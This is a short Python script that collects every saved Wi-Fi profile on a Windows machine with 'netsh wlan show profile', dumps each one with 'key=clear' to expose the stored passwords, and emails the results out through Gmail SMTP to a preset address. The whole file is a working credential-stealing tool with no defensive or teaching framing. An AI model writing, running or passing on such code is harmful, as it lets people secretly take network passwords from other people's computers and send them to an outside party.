#!/usr/bin/env python
import re
import smtplib
import subprocess
from email.header import Header
from email.mime.text import MIMEText

import chardet


# https://myaccount.google.com/lesssecureapps

def get_mime_text(plain_msg, subject, sender, recipients):
    mime_msg = MIMEText(plain_msg, 'plain', 'utf-8')
    mime_msg['Subject'] = Header(subject, 'utf-8')
    mime_msg['From'] = sender
    mime_msg['To'] = recipients
    return mime_msg


def send_mail(mime_msg, psw):
    server = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
    try:
        server.starttls()
        server.login(mime_msg['From'], psw)
        server.sendmail(mime_msg['From'], mime_msg['To'], mime_msg.as_string())
    finally:
        server.quit()


def get_wifi_info():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)

    encoding = chardet.detect(networks)['encoding']
    networks_names_list = re.findall("(?:\\s:\\s)(.*)", networks.decode(encoding))
    result = ""
    for network_name in networks_names_list:
        command = "netsh wlan show profile " + network_name + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result = result + current_result.decode(encoding)
    return result


plain_msg = get_wifi_info()
login = "xxx@gmail.com"
psw = ""
recipients_emails = login

mime_msg = get_mime_text(plain_msg, "Report", login, login)

send_mail(mime_msg, psw)
